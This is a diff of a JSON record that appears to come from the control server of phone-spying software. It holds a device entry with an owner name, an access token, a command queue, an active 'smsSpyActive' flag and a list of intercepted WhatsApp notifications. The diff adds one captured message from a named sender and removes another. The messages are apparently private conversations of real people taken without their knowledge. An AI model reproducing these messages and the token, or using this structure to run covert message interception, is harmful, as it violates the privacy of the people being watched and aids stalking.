@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776914440944,
+    "lastSeen": 1776914468041,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Nakan",
+        "content": "berdoa biar di tempat baru nanti dapat ortu baru ya seng",
+        "time": "23/04 11:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776914468324
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 04:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1776891563546
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Nakan & prily 🤍",
-        "content": "Telepon video grup berlangsung",
-        "time": "23/04 04:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776891542562
       }
     ],
     "galleryPhotos": [],
